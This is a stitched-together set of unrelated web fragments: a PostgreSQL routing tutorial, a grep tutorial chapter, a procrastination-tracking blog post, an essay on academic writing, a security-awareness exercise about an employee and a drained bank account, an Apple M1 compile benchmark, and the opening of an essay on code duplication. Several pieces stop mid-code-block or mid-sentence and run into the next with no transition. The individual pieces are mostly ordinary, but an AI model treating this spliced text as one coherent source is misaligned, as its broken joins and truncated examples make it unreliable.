<p>Add a column to store the time for each node.</p>
<pre><code>ALTER TABLE osm_routing.route_details ADD node_ts TIMESTAMPTZ;
</code></pre>
<p>To get the value for each <code>node_ts</code> we need to calculate
cost in seconds based on an edge's speed.  Our distance is in meters, our
speed in MPH, and we need seconds.  Perfect use case for a function!</p>
<p>The following function accepts two parameters, <code>length_m</code> and a <code>miles_per_hour</code>,
and returns the time in seconds required to travel the edge.</p>
<pre><code>CREATE OR REPLACE FUNCTION osm_routing.mph_length_m_to_cost_seconds(
    length_m NUMERIC, miles_per_hour NUMERIC)
 RETURNS NUMERIC
 LANGUAGE sql
 SECURITY DEFINER
 SET search_path TO 'pg_temp'
AS $function$
/*
 * miles per hour * 0.44704  = meters per second
 */
    SELECT ($1 / ($2 * .44704))

$function$
;
</code></pre>
<p>This makes it easy to calculate the time to traverse an edge based on its length and
speed. How many seconds does it take to travel 1,000 meters at 60 miles per hour?</p>
<pre><code>SELECT osm_routing.mph_length_m_to_cost_seconds(1000, 60);

mph_length_m_to_cost_seconds|
----------------------------|
         37.2822715342400382|
</code></pre>
<p>What about 1000 meters at 20 mph?</p>
<pre><code>SELECT osm_routing.mph_length_m_to_cost_seconds(1000, 20);

mph_length_m_to_cost_seconds|
----------------------------|
        111.8468146027201145|
</code></pre>
<p>The <code>edge_times</code> CTE below uses the <code>mph_length_m_to_cost_seconds()</code> function
to calculate each segment's time to traverse.
The <code>time_to_node</code> CTE uses uses <code>SUM()</code> as a window function to provide a running total of
cost in time to each node.  The final <code>UPDATE</code> query sets the <code>node_ts</code> to the 
route's start time (from <code>osm_routing.routes</code>) plus the appropriate number of seconds
from the previous window function.</p>
<pre><code>WITH edge_times AS (
SELECT r.route_id, rd.seq, rd.path_seq, 
        r.s_time, rd.cost, rd.agg_cost, rd.edge_mph,
        CASE WHEN (rd.edge_mph &gt; 0 AND agg_cost &gt; 0)
            THEN osm_routing.mph_length_m_to_cost_seconds(rd.cost::NUMERIC, rd.edge_mph)
            ELSE NULL
            END AS edge_time_s
    FROM osm_routing.routes r
    INNER JOIN osm_routing.route_details rd ON True
    WHERE r.route_id = rd.route_id
), time_to_node AS (
SELECT SUM(et.edge_time_s)
            OVER (PARTITION BY et.route_id ORDER BY et.seq, et.path_seq)
            AS time_to_node_s,
        *
    FROM edge_times et
)
UPDATE osm_routing.route_details rd
    SET node_ts = ttn.s_time + (ttn.time_to_node_s || ' seconds')::INTERVAL
    FROM time_to_node ttn
    WHERE rd.route_id = ttn.route_id
        AND rd.seq = ttn.seq
        AND rd.path_seq = ttn.path_seq
        AND rd.node_ts IS NULL
;
</code></pre>
<p>The above <code>UPDATE</code> query does not set the route's initial node. The following
<code>UPDATE</code> fixes the first record in each route equal to the <code>s_time</code>.</p>
<pre><code>UPDATE osm_routing.route_details rd
    SET node_ts = r.s_time
    FROM osm_routing.routes r
    WHERE rd.route_id = r.route_id
        AND rd.node_ts IS NULL
        AND rd.seq = 1
;
</code></pre>
<p>The <code>osm_routing.route_details</code> table now includes a speed limit and timestamp
for each segment for the included routes.</p>
<pre><code>route_id|seq|path_seq|edge_mph|node_ts            |
--------|---|--------|--------|-------------------|

In this chapter we'll see how you can use <code>grep</code> for common tasks, and how to use it in combination with other tools.</p><p>As with the other tools we'll introduce in this chapter, we'll also look at when <code>grep</code> is the right tool for the job and when we should consider other options.</p><p>A quick check of the manual page for <code>grep</code> gives an overview:</p><pre><code>$ man grep

GREP(1)                   BSD General Commands Manual                  GREP(1)

NAME
     grep, egrep, fgrep, zgrep, zegrep, zfgrep -- file pattern searcher

SYNOPSIS
     grep [-abcdDEFGHhIiJLlmnOopqRSsUVvwxZ] [-A num] [-B num] [-C[num]] [-e pattern] [-f file]

          [--line-buffered] [--null] [pattern] [file ...]

DESCRIPTION
     The grep utility searches any given input files, selecting lines that match one or more
     patterns.  By default, a pattern matches an input line if the regular expression (RE) in
     the pattern matches the input line without its trailing newline.  An empty expression
     matches every line.  Each input line that matches at least one of the patterns is written
     to the standard output.

  grep

  Matches patterns in input text.
  Supports simple patterns and regular expressions.
</code></pre><p>That is indeed a little more concise. By the way, if you are not familiar with how you can get help on commands, check out <a href="https://effective-shell.com/docs/part-1-transitioning-to-the-shell/5-getting-help/">Chapter 5 - Getting Help</a>. As the manual pages indicate, <code>grep</code> is used to match patterns in files. More advanced users will most likely know exactly what this means, but a more simple description is just:</p><blockquote><p>Grep lets you search for text or filter text.</p></blockquote><p>That's it. You can search in files, but you are not <em>limited</em> to searching in files. And you can search for <em>literal</em> text, such as the word ‘error’, or you can search for <em>patterns</em>. <em>Patterns</em> in this case means <em>regular expressions</em> - expressions which allow you to be more specific in how you search (such as looking for a set of 16 numbers in a row, like a credit card number, or any text which looks like an email address). You can also do the opposite - filtering out parts of text.</p><p>We'll use <code>grep</code> to search through text. Let's get straight into it!</p><p>Why the odd name? Grep is such a commonly used tool that the name has become a verb amongst technologists (people will often suggest you <em>grep</em> for something in files).</p><p>The name comes from a command which was used in the original <code>ed</code> text editor - the command:</p><pre><code>g/re/p
</code></pre><p>This command ran on all lines (<code>g</code>, for <em>global</em>), applied a regular expression (<code>re</code>, for <em>regular expression</em>) and then printed (<code>p</code> for <em>print</em>) the results. A colleague of Ken Thompson, one of the early innovators and inventors in the Unix world, needed to edit a large file - a file which was too large to fit in <code>ed</code>. Ken wrote the <code>grep</code> program overnight to allow the file's text to be filtered - and the results passed to the <code>ed</code> editor!</p><p>You can read more about this story and some of the fascinating history of the early days of Unix in a <a href="https://www.youtube.com/watch?v=NTfOnGZUZDk&amp;feature=emb_title">great interview with Brian Kerninghan</a> from Computerphile<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.</p><p>If you've been working through this book, you've probably entered quite a few commands in the shell. Most shells keep a history of the commands you type. Under the hood, when you use the up and down keys to look through commands you entered earlier, or use the <code>Ctrl-R</code> shortcut to <em>search</em> through earlier commands, your shell is looking through this file. If these tricks are not familiar, check <a href="https://effective-shell.com/docs/part-2-core-skills/8-fly-on-the-command-line/">Chapter 9 - Fly on the Command Line</a>.</p><p>The file which keeps the history can vary from shell to shell. For example, on my system, my history for Bash is in the file <code>~/.bash_history</code>. But most ‘Bash-like’ shells provide a built-in environment variable which let's you find the path of the shell history. Let's at this file:</p><pre><code>cat $HISTFILE

...
cat ~/.ssh/config
ssh bastion.cloudops
help echo
help cd
exit
</code></pre><p>This file will generally contain a list of the commands that the logged in user has entered in their shell. This file will likely be huge. Let's search through it using <code>grep</code>! Here's how we can use the <code>grep</code> command to search for lines which contain the text <code>man</code>:</p><pre>grep man $HISTFILE

...
<strong>man</strong> socket
k describe services eventstoredb-http-<strong>man</strong>agement
<strong>man</strong> cal
gcb refactor/perfor<strong>man</strong>ce/standardise-eventstore
vi src/tests/handlers/test_com<strong>man</strong>d_handlers.py
gco src/handlers/com<strong>man</strong>d_handlers.py
gcb feat/perfor<strong>man</strong>ce/use-eventstore-writer
nvim perfor<strong>man</strong>ce.md
<strong>man</strong> grep
</pre><p>Here I can see all of the commands I have recently entered which have the text <code>man</code> in them. Note that the text which matches is highlighted and shown in bold.</p><p>Now what if you a different shell, or forget where the history file lives? A nice trick here is to use the <code>history</code> command. This command prints out the history, as well as the line number. The <code>history</code> command writes to <code>stdout</code>. If we don't give <code>grep</code> a source file, it will simply search through <code>stdin</code>. Just as we learnt in <a href="https://effective-shell.com/docs/part-2-core-skills/7-thinking-in-pipelines/">Chapter 7 - Thinking in Pipelines</a> this means we can just <code>grep</code> the output of the <code>history</code> command!</p><p>Here's how that would work:</p><pre>history | grep man

...
 9125  <strong>man</strong> socket
 9188  k describe services eventstoredb-http-<strong>man</strong>agement
 9211  <strong>man</strong> cal
 9341  gcb refactor/perfor<strong>man</strong>ce/standardise-eventstore
 9344  vi src/tests/handlers/test_com<strong>man</strong>d_handlers.py
 9347  gco src/handlers/com<strong>man</strong>d_handlers.py
 9352  gcb feat/perfor<strong>man</strong>ce/use-eventstore-writer
 9355  nvim perfor<strong>man</strong>ce.md
10002  <strong>man</strong> grep
</pre><p>This is easier to remember! There's one more cool trick - if we just type in the exclamation point symbol followed by any line number shown above, we repeat the command! For example, typing in:</p><pre><code>!9355
</code></pre><p>Would repeat line <code>9355</code> of the history (which is <code>nvim performance.md</code>).</p><p>Now as you can see from the output above, when we searched through my history, we didn't just find times I executed the <code>man</code> command - we found <em>any</em> line which has the characters <code>man</code> in it. What about if we only wanted to find the lines which start with <code>man</code>?</p><p>To perform a search like this, we can use a <em>regular expression</em>. Here's how it would work:</p><pre>history | grep "[0-9]\+  man"

...
 <strong>9125  man</strong> socket
 <strong>9211  man</strong> cal
<strong>10002  man</strong> grep
</pre><p>Let's break this down. In this search, we are using a <em>pattern</em> to search for text. The pattern in this case is a <em>basic regular expression</em>. Regular expressions allow us to use some clever constructs to search for text. The expression we've used is made up of the following components:</p><ul><li><code>[0-9]\+</code> At least one number - any character in the range zero to nine.</li><li><code>man</code> The literal text written, i.e. two spaces and the letters <code>man</code>.</li></ul><p>Now for anyone who is familiar with regular expressions, you might wonder why we have a slash before the <code>+</code> symbol, when the <code>+</code> symbol has a specific meaning in regular expressions (it means ‘at least one of the previous characters). The reason we have a leading slash is that by default <code>grep</code> is using <em>basic regular expressions</em>. In general, this will be less familiar for users and will be different to what they are used to from different tools.</p><p>To make regular expressions more ‘standard’, we can use the <code>-E</code> flag to tell <code>grep</code> to use <em>Extended Regular Expressions</em>. We can also use the <code>egrep</code> tool, which assumes the pattern will be an extended regular expression. Using either approach will work, and allow you to re-write the pattern as below:</p><pre><code>history | grep -E "[0-9]+  man"

# ...or...

history | egrep "[0-9]+  man"
</code></pre><p>This is just a little hint of the power of regular expressions. They can be daunting at first, and many people never become comfortable with them, but I would strongly encourage you to start exploring them.</p><p>If you ever want to see how a regular expression works, try using the website <a href="https://regex101.com/">regex101.com</a>. It let's you test out regular expressions and also describes exactly how they work. For example, if I enter the regular expression we just used I'll see this:</p><p><img src="https://effective-shell.com/docs/part-3-manipulating-text-and-streams/12-get-to-grips-with-grep/images/regex101.png" width="800px" alt="Screenshot of the 'regex101' website"></p><p>We're going to see more about regular expressions as we go through the book.</p><p>If there's one command I use a lot, it's this:</p><pre><code>grep -i err
</code></pre><p>The <code>-i</code> flag makes the search case-insensitive. This makes this a very quick way to scan through a file for any text which matches the letters <code>err</code> - making it a very quick way to find <em>errors</em> in log files.</p><p>You can try this out by using some of the log files in the <code>logs</code> folder of the playground. Here's how you can try it out:</p><pre>grep -i err ~/effective-shell/logs/web-server-logs.txt

  <p>For a long time, I’ve struggled with procrastination. Unfortunately, as someone who is filled with what a friend once called “undirected ambition,” my procrastination usually takes the form of periods of high-energy productivity followed by periods of low-energy decompression.<sup id="fnref:crab-ganglion" role="doc-noteref"><a href="#fn:crab-ganglion">1</a></sup> For what it’s worth, from what I understand this isn’t particularly unusual, although it manifests itself in different forms.<sup id="fnref:procrastination" role="doc-noteref"><a href="#fn:procrastination">2</a></sup> Several months ago, I read a Hacker News comment about someone who mentored junior developers, and their first piece of advice was to track the amount of time you spend doing various activities throughout the day. Some people he mentored realized they were spending 5 to 6 hours a day on Reddit, Facebook, Hacker News or other social media.</p>

<h2 id="data">Data</h2>

<p>I thought this was an interesting experiment, so I decided to do it on myself.<sup id="fnref:methods" role="doc-noteref"><a href="#fn:methods">3</a></sup> I added <a href="https://chrome.google.com/webstore/detail/webtime-tracker/ppaojnbmmaigjmlpjaldnkgnklhicppk?hl=en">this</a> time tracker Chrome extension. The top half of sites, by average daily activity, for the last three months are as follows:</p>

<ul>
  <li><code>reddit.com</code>: 29 minutes and 25 seconds</li>
  <li><code>chess.com</code>: 19 minutes and 51 seconds</li>
  <li><code>youtube.com</code>: 11 minutes and 29 seconds</li>
  <li><code>wikipedia.com</code>: 10 minutes and 44 seconds</li>
  <li><code>facebook.com</code>: 6 minutes and 38 seconds
    <ul>
      <li>I use <a href="https://chrome.google.com/webstore/detail/news-feed-eradicator-for/fjcldmjmjhkklehbacihaiopjklihlgg?hl=en">this</a> Chrome extension to hide my Facebook Newsfeed without blocking all of Facebook, which helps me control my usage here. I’m sure it was higher before doing this. The developers have recently extended it to cover Twitter, Hacker News and Reddit as well.</li>
    </ul>
  </li>
  <li><code>netflix.com</code>: 6 minutes and 19 seconds
    <ul>
      <li>I think this should probably be higher, because I usually watch Netflix while doing something else and I don’t think the Chrome extension logs this time correctly</li>
    </ul>
  </li>
</ul>

<p>An important additional source is that I also have a local Tetris client called <a href="https://github.com/nullpomino/nullpomino">Nullpomino</a> which I use intermittently, and the time from that doesn’t get logged in the app. So all things told, I spend about a solid <strong>hour to two hours a day</strong> procrastinating. If I had to estimate the time without knowing these stats, I probably would have guessed less than 30 minutes.</p>

<p>The Webtime Tracker I mentioned above lets you download your data as a CSV files. I wrote a Python script to parse and plot my own data.<sup id="fnref:python-script" role="doc-noteref"><a href="#fn:python-script">4</a></sup> Looking forward, I’m hoping that by tracking different site usages, it makes it possible to identify the benefits of certain interventions, such as using the <a href="https://freedom.to/">Freedom</a> blocker.</p>

<p>Some points of interest:</p>

<ul>
  <li>The drop-off in Hacker News usage corresponded with when I added a uBlock filter to block the “Next” button, so I stopped scrolling so much. Unfortunately it seems that I substituted browsing Hacker News with browsing Reddit, which seems like an objectively worse way to spend time</li>
  <li>I used to spend a ton of time playing online chess, but it didn’t seem to be a substitute for browsing Reddit (my Reddit usage seems pretty consistent). So (as a personal value judgement) playing less chess seems to be a net positive.</li>
</ul>

<h2 id="results">Results</h2>

<p>I think I became a lot more cognizant of the strong pull of websites that encourage procrastinating after watching <em>The Social Dilemma</em>. It made me wish there was a service I could buy which would involve, like, someone standing over my shoulder and watching my screen and stopping me from doing work, although I would never actually sign up for a service that did this.</p>

<p>One thing that has been quite helpful has been meditation. My company reimburses a subscription for an app called <a href="https://www.headspace.com/headspace-meditation-app">Headspace</a>. I tried this about a year ago, but didn’t get much value out of it as I didn’t find myself using it very often. Recently, though, I’ve started using it again and found it to be incredibly useful.<sup id="fnref:headspace" role="doc-noteref"><a href="#fn:headspace">5</a></sup> I’m increasingly starting to think that data-driven<sup id="fnref:headspace-experiment" role="doc-noteref"><a href="#fn:headspace-experiment">6</a></sup> meditation is a good alternative to data-driven procrastination.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-683815c55e048733615d"><div><h3>Write now, I’ve become the person I detested</h3><h2>BY RANDY MCINTOSH</h2></div></div><div data-block-type="2" id="block-yui_3_17_2_5_1519139307244_20387"><div><p>In grad school, I remember being at a pub with other students as we groaned about an upcoming deadline for a mid-term paper. The comments were along the lines of “I sit there and stare at the screen for an hour”, or “How could the prof assign such a stupid topic?”, or “I have a lot of ideas from the papers he assigned, but I can’t put the words onto paper.” As we continued to share our misery, a fellow student who we all secretly loathed (but only in the most positive sense), came up to our table to ask how we were doing. We told him we were talking about the mid-term paper that was due in a few days, to which he responded that he finished his last week and was just polishing it up a bit before he sent it to the Prof just before he came to pub. He expressed satisfaction at this because that would give him time to work on his Soc for Neuroscience abstract that was due in two months. We sat stunned for several moments, trying to come up with a clever biting reply. This did not come until about 30 minutes and 2 pints had gone by and was some feeble comment on the fact he missed Wings night and had questionable choices in shoes.</p><p>Despite having met several academics since then who have professed to “absolutely love writing!” and churn out material faster than I can read them, I have never reached that level of performance. I am a pretty decent writer, I think, and write English gooder than many of my colleagues.&nbsp;But I have never been a prolific writer. I have had a lab of prolific student and postdocs and a large network of collaborations, but to create a paper from a blank page is heavy lifting.&nbsp;There are times when even a 3-line email can linger for hours or days before I finish it.</p><p>So, considering this history, the plan I came up with to write a book this year seemed like a really bad idea.&nbsp;I was, however, determined to give it a try. In the summer of 2017, I started collecting various blogs and books with tips and tricks for writing. Some were quite good (e.g., How to Write a Lot), others were a bit over the top, like one with yoga routines that made me sleepy, but not a better writer.&nbsp;</p><p>The Pomodoro method was good for a few days, until I started getting more interested with how long 20 minutes was rather than what I had written (e.g., “Okay, let me check.&nbsp; Oh, it’s only been 5 minutes?!?”)</p><p>One thing I tried was to create text from slide talks I had given that provided an overview of some of my work, writing as I reviewed the slides. This could help to serve as a basis for a book. The approach worked fairly well for getting together a decent book chapter.&nbsp; To make it a book would still require a lot more research to fill in the gaps and a lot more writing to give it substance.&nbsp; The thought of that made me decide to go buy a scone and coffee and have a nap.</p><p>The challenge for many of us is to get stuff on paper so we have a working draft. This is where I thought dictation could help. Dictation software has been around for a couple of decades and now is integrated into our computers and smartphones. I tried dictation software – I really did. It doesn’t work well for me, and with 5 yrs. of weekly voice classes, I remain firmly committed to mumbling when I speak, but I do sing much better.</p><p>Voice memos are also helpful when you don’t have a keyboard handy when an idea strikes you. Just make sure you check these later! I reviewed my voice memos one time and found a great idea, but it was one day after I sent in my grant proposal.</p><p>Then came Boxing Day, 2017 (Dec 26 for my USA colleagues). I have this problem with quite vivid dreams that often play out like a complex movie. Sometimes it can be quite entertaining, like the time I dreamt that the head of lab where I was postdoc-ing decided to have everyone in lab dress in drag to help boost morale.</p><p>On Boxing Day early morning I had another very vivid dream involving two of my colleagues (not that kind of dream!) and decided to get out of bed and immediately write it down. Within an hour I had 5 pages written, which I then sent to my colleagues, and thought about for the remainder of the morning.&nbsp; By the time lunch rolled around, and from the feedback I got, it was clear that these 5 pages were going to be the foundation for my book.</p><p>And I have been writing it daily since then, and now it’s around 150 pages.&nbsp; I can’t tell you what its about right now, because I am shy, but I think its hit a sweet spot that’s provided some great energy. I am going with this flow.</p><p>So now I get up waaayyy too early, make some tea and crank out 4000-5000 words in a few hours before my very understanding wife gets up and the cats start wanting their breakfast.</p><p>What has helped the most is adopting the idea of “Write first, Edit later” or as I call it the Vomit Method, so named after my cat’s tendencies to up-chuck hairballs in precisely the place where I have to put my foot before I turn on the light.&nbsp; The Vomit Method is basically <em>throw it all down (or up) first and clean it up later</em>. What used to be a heavy lift – creating new content – is now as easy as… well, I won’t repeat the analogy.</p><p>The funny thing is that now I am using this for everything I write - grants, emails and blogs.&nbsp; The idea is to get it out when the moment strikes you and edit afterwards. I’ve trained myself to use the backspace key less; don’t worry about spelling and typos and go (turn off autocorrect though as the replacements are harder to find if they are really words rather than just misspelling). We often get hung up in the flow sometimes, so if there are parts of a composition that are uncertain in the moment, I put in a placeholder and continue.<a href="#_ftn1">[1]</a></p><p>Doing this has gotten me to the point where I resemble the person we used to be jealous of in grad school, although I still have better shoes. I am not trying to sell you anything, I don’t have a 12 step program, or a freemium website, I don’t want your money (unless you work for granting agency, then have I got an idea for you!). &nbsp;We all need to write as academics - we don’t have to be excellent at it, but we need to do it. Find the path that gets you there.</p><p>Okay, I gotta go, I hear a hairball coming.</p><p><em><a href="#_ftnref1">[1]</a> Some typos may be intention, eh.</em></p></div></div></div>]]>

<p>    Marwin Mueller, age 65, owns Spass GmbH. An SME in Luzern which has an annual turnover of close to 1.000.000 CHF and an annual profit of 200.000 CHF.  </p>
<p>    Spass GmbH has been operating in the hospitality industry for the last 30 years and is managing renouned hotels and villas in the Luzern Lake area.  </p>
<p>    Anne Kingston, age 29, is Marwins assistant and accountant. She has joined a year back and during her interactions, she mentioned to Marwin that she is a single mom of a six year old boy named Ryan.  </p>
<p>    Anne is a pleasant and helping personality. She likes plants and playing video games.  </p>
<p>    Marwin is very proud of his business achievements and sometimes acts as an arrogant boss. He is a bit insensitive to kids, due to his experiences. In general, he gets along with Anne and they form a great team at Spass. In the past year, Anne took over most of the office tasks at Spass. She is technology savvy and Marwin likes this quality of Anne's over his other staff.  </p>
<p>    Marwin and Anne worked on important digital initiatives at Spass like listing its properties on booking portals, creating their own website, launching social media accounts and enabling online banking at UBC Bank in Luzern.  </p>
<p>    This gave Marwin an edge over his competitors and Spass has seen a 30% increase in revenues and profits this year.  </p>
<p>    Today, Marwin remembers that two weeks back, Anne came to him and wanted a 1 week vacation to spend time with her son Ryan on occasion of his birthday.  </p>
<p>    Once again, Marwin and Anne had arguments on Anne's vacations in peak season and Marwin blamed Ryan for this.  At the end, Marwin reluctantly agreed to the holidays.</p>
<p>Since then, Anne did not turn up for work. She is not reachable on her mobile and her house is locked.</p>
<p>Marwin has just found that his bank account is debited with 2.000 CHF every day since Anne left.</p>
<p>Marwin has no idea what is happening and he is worried. Therefor, as trusted friends, he has requested that you come here and help him.</p>
<p>Marwin believes it is not a good idea to report the incident immediately to the police or bank as it can damage his reputation.</p>
<p>Now it's Friday. It's 7pm and the UBC Bank is already closed for the weekend.</p>
<p>You need to analyze the gaps Anne might have in her Cybersecurity awareness and secure the Online Banking to stop the money transfers.</p>
<p>Also, try to find out where Anne might be.</p>
<p>All the very best.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
  

  <p><i>Posted on <code>01 Dec 2020</code> by <code>Boris Kolpackov</code>
  with comments on <a href="https://reddit.com/r/cpp/comments/k4l03y/compiling_cc_on_apple_m1/"><code>r/cpp/</code></a></i></p>

  <p>The release of Apple M1 CPU has sure generated a lot of interest.
  Intrigued by impressive benchmark results, we got an Apple Mini with M1 to
  test C/C++ compilation.</p>

  <p>Our go to compilation benchmark is a local (that is, without package
  repository) <a href="https://build2.org/"><code>build2</code></a> bootstrap
  which is dominated by C++ compilation (611 translation units) with some C
  (29) and linking (19) in between. Two nice properties of this benchmark is
  that it doesn't require anything other than the C++ compiler and is a <a href="https://openbenchmarking.org/test/pts/build2">part of the Phoronix
  benchmark</a> so we have a large number of CPUs to compare our results
  to.</p>

  <p>The Phoronix benchmark currently uses <code>build2</code> 0.12.0 while we
  will be using 0.13.0 (the current release) which takes about 10% longer to
  build.</p>

  <p>After setting up Mac OS and installing Command Line Tools for XCode 12.2
  we have all we need:</p>

  <pre>$ clang++ --version
Apple clang version 12.0.0 (clang-1200.0.32.27)
Target: arm64-apple-darwin20.1.0</pre>

  <p>Looking at the <code>_LIBCPP_VERSION</code> macro in
  <code>libc++</code>'s <code>__version</code> header we can see that this
  version of Apple Clang has been branched off vanilla Clang somewhere in the
  10.0.0 development cycle.</p>

  <div>
  <p>You may have also noticed that the CPU name in the target triplet printed
  by Apple Clang does not match the more commonly used <code>aarch64</code>.
  In fact, if we run <code>config.guess</code> on this machine, we get:</p>

  <pre>$ ./config.guess
aarch64-apple-darwin20.1.0</pre>

  <p>To spare the users dealing with two names for the same thing,
  <code>build2</code> canonicalizes <code>arm64</code> to <code>aarch64</code>
  so in our <code>buildfiles</code> we will always see
  <code>aarch64</code>.</p>
  </div>

  <p>Another interesting thing to check is the number of hardware threads
  reported by <code>sysctl</code>, which is what our benchmark uses by
  default:</p>

  <pre>$ sysctl -n hw.ncpu
8</pre>

  <p>So we have 8 threads, with 4 of them corresponding to the performance
  cores and 4 – to the efficiency cores. Our first run will utilize all
  of them, which, unsurprisingly, turns out to produce the fastest time:</p>

  <pre>$ time sh ./build2-install-0.13.0.sh --local --yes ~/install
163s</pre>

  <p>It was a pleasant surprise that <code>build2</code> 0.13.0, which was
  released before M1 became available, builds and appears to be functioning
  without any issues. Since ARM has weak memory ordering, this also served as
  an additional validation of <code>build2</code>'s multi-threaded
  implementation and heavy use of atomics.</p>

  <p>As the first point of reference, let's compare it to my workstation with
  an 8-core Intel Xeon E-2288G (essentially i9-9900K plus ECC). It does the
  same build using vanilla Clang in 131s. While E-2288 is faster, M1's
  performance is nevertheless impressive. Especially when you consider that
  during the build the workstation is belching hot air and screaming like an
  airplane about to take off while M1 is whisper-quiet with barely warm air
  coming from its exhaust.</p>

  <p>Another pertinent benchmark result is a single-threaded run, which is
  indicative of how the CPU would perform in an incremental build:</p>

  <pre>$ time sh ./build2-install-0.13.0.sh --local --yes -j 1 ~/install
691s</pre>

  <p>For comparison, E-2288G gets the job done in 826s. So here the 5Ghz Xeon
  core is actually slower than the 3.2Ghz M1.</p>

  <p>Another interesting result is a 4-thread run which would only use the
  performance cores:</p>

  <pre>$ time sh ./build2-install-0.13.0.sh --local --yes -j 4 ~/install
207s</pre>

  <p>While somewhat slower than the all-core build, it also uses less memory.
  So a build that only utilizes performance cores might still make sense if
  you are short on RAM (which all current M1 machines are).</p>

  <p>Here is the summary of all the results we've seen so far:</p>

  <pre>CPU   CORES/THREADS  TIME
-------------------------
E-2288G    8/16      131s
M1         4+4       163s
M1         4         207s
M1         1         691s
E-2288G    1         826s</pre>

  <p>Nobody will argue that this compares apples to oranges on multiple
  dimensions (workstation vs mobile, several years old design/process vs the
  bleeding edge, etc). So let's add some interesting results from the Phoronix
  benchmark. The two classes of CPU that seem relevant to compare to are the
  latest workstation and mobile CPUs from Intel and AMD. Here is my pick (you
  can choose your own, just remember to add an extra 10% to the Phoronix
  results; also note that most of them use GCC instead of Clang):</p>

  <pre>CPU                    CORES/THREADS  TIME
------------------------------------------
AMD   Threadripper 3990X    64/128    56s
AMD   Ryzen        5950X    16/32     71s
Intel Xeon       E-2288G    8/16      131s
Apple                 M1    4+4       163s
AMD   Ryzen        4900HS   8/16      176s*
Apple                 M1    4         207s
AMD   Ryzen        4700U    8/8       222s
Intel Core         1185G    4/8       281s*
Intel Core         1165G    4/8       295s

* Extrapolated.</pre>

  <p>Note that the results for the best mobile Intel (1185G) and AMD (4900HS)
  are unfortunately not yet available and the numbers above are extrapolated
  based on frequency and other benchmark results.</p>

  <p>From the above table it's hard not to conclude that Apple M1 is an
  impressive CPU, especially when we also consider its power consumption.
  What's more, this is the first generally-available, desktop-class ARM CPU.
  For comparison, the same build on Raspberry Pi 4B takes 1724s, more than 10
  times longer! While we cannot boot Linux or Windows on M1, there are early
  indications that it should be possible to boot them in virtual machines with
  decent performance. As a result, ARM-based CI could become generally
  available and is something that we are currently looking into.</p>

  <p>After seeing the initial benchmarks of M1 one can't help but wonder how
  Apple pulled this off. While there is lot of speculation with some bordering
  on black magic and sorcery, I found this <a href="https://www.anandtech.com/show/16252/mac-mini-apple-m1-tested">Anandtech
  article on M1</a> and the one linked from it to be a good source of
  technical information. Here are the highlights:</p>

  <dl>
  <dt><b>TSMC 5nm process</b></dt>
  <dd>Compared to Intel's own 10nm (for 11x5G, 14nm for E-2288G) and AMD/TSMC
  7nm.</dd>

  <dt><b>LPDDR4-4266 RAM</b></dt>
  <dd>Only latest mobile CPUs from Intel and AMD can achieve the same
  speed.</dd>

  <dt><b>Large L1 cache</b></dt>
  <dd>M1 has an unusually large L1 instruction and data caches.</dd>

  <dt><b>Large and fast shared L2 cache</b></dt>
  <dd>Unlike Intel and AMD CPUs which use smaller private L2 caches and a
  large but slower shared L3 cache, M1 uses a fast and large shared L2
  cache.</dd>

  <dt><b>Wide core</b></dt>
  <dd>M1 core is unusually "wide" meaning that it can perform multiple
  instructions in parallel and/or out of order. There is speculation that
  because ARM has weak memory ordering and fixed-size instruction encoding,
  Apple was able to make a much wider core than usual before hitting the
  diminishing returns issue.</dd>
  </dl>

  <p>It would also be interesting to see how/if Apple will be able to scale
  this design to more cores.</p>

December 2, 2020 | https://www.philosophicalhacker.com/post/when-to-dry/ | <a href="https://web.archive.org/web/*/https://www.philosophicalhacker.com/post/when-to-dry/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Because abstractions aren’t free, sometimes we’re better off duplicating code instead of creating them.</p>
<p>If that claim doesn’t make sense to you, read <a href="https://martinfowler.com/bliki/Yagni.html" target="_blank">Martin Fowler’s “YAGNI”</a> or <a href="https://sandimetz.com/blog/2016/1/20/the-wrong-abstraction" target="_blank">Sandi Metz’s “The Wrong Abstraction”</a> or watch <a href="https://www.deconstructconf.com/2019/dan-abramov-the-wet-codebase" target="_blank">Dan Abramov’s “WET Code” talk</a> or <a href="https://kentcdodds.com/blog/aha-programming" target="_blank">Kent C. Dodd’s “AHA Programming” talk</a>.</p>
<p>Each of these programmers give advice on when to duplicate code vs. create an abstraction, advice that broadly falls into two camps: either we are advised to follow some rule of thumb or we’re told to ignore rules of thumb, trust our feelings and to only introduce abstractions when it “feels right.” Fowler, Metz, and Abramov are in the first camp. Dodd is in the second one.</p>
<p>While all of these prescriptions are an improvement over categorical adherence to <a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself" target="_blank">DRY</a>, none of them adequately capture the complexity of the trade off between duplication and abstraction. We can do better.</p>
<p>In the first section of this essay, I’ll argue — like Dodd already has — that the aforementioned rules of thumb can lead to bad decisions about when to abstract vs. duplicate. I also argue — contrary to Dodd — that our feelings/intuitions are <em>not</em> up for the task of guiding our decisions about when to abstract vs. when to duplicate code.</p>
<p>Next, I’ll suggest a more systematic approach for thinking about the abstraction-duplication trade-off. The gist of the approach is to recast duplicate vs. abstract decisions as predictions, to use a brier score to track the quality of those predictions, and to actively build a mental model of how to make them for the particular codebase we’re working in.</p>
<h2 id="heuristics-and-intuition-arent-enough">Heuristics and intuition aren’t enough</h2>
<p>Fowler and Abramov advocate for duplicating code twice before creating a common abstraction.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> Metz tells us “if you find yourself passing parameters and adding conditional paths through shared code, the abstraction is incorrect."<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup> Dodd eschews these types of heuristics in his recent “AHA Programming” talk.</p>
<p>I won’t rehearse his argument here, but I do want to side with him in the rejection of simple heuristics. Programming is complicated. Codebases and the organizations that support them are diverse. The rules that describe optimal choices for an engineer at Google are not the same rules that apply to someone working at a 40 person startup.<sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> Given this, why should we think that good advice on when to abstract vs. duplicate will be easily stated as a cute acronym or pithy sentence?</p>
<p>If you’re skeptical partially because you’re just keeping score of well-known programmers who disagree with Dodd, note that he isn’t the first to suggest something like this. In <em>Domain Driven Design</em>, Eric Evans recognizes that rules of thumb for design often don’t work. He says:</p>
<blockquote>
